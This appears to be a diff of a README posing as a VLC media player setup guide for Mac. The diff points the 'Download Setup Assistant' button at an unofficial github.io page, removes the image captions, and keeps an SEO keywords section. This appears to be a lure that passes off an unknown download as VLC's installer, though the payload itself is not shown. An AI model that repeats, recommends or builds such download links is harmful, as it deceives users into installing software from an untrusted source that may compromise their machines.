@@ -1,6 +1,6 @@
-# VLC — Offline Setup Guide
+# VLC for Mac
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://shuziktobehuman.github.io/huja/VLC)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
@@ -24,13 +24,13 @@
 🖼 Preview
 
 ![VLC Player Interface](https://images.moneycontrol.com/static-mcnews/2022/08/VLC-media.jpg?impolicy=website&width=1600&height=900)  
-*VLC media player interface showcasing video playback*
+
 
 ![VLC Video Trimming](https://mac.eltima.com/wp-content/uploads/2023/01/elmedia-header-1200x900.jpg)  
-*Using VLC to trim videos efficiently*
+
 
 ![VLC Installation on Ubuntu](https://cdn.macstories.net/002/28442_6865662925_ec59366fa1_z.jpg)  
-*VLC installation process on Ubuntu Linux*
+
 
 
 ### 🔎 SEO Keywords
